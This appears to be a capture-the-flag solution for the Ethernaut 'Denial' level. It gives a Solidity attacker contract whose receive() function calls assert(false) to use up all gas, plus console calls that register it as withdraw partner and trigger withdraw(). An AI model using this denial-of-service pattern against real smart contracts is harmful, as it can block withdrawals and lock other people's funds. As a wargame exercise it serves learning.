pragma solidity ^0.6.0;

contract DenialAttack {
    receive() external payable {
        assert(false);
        }
}

//Above is the source code and below is the Ethernaut console code.

contract.setWithdrawPartner("Deployed contract address")

contract.withdraw()
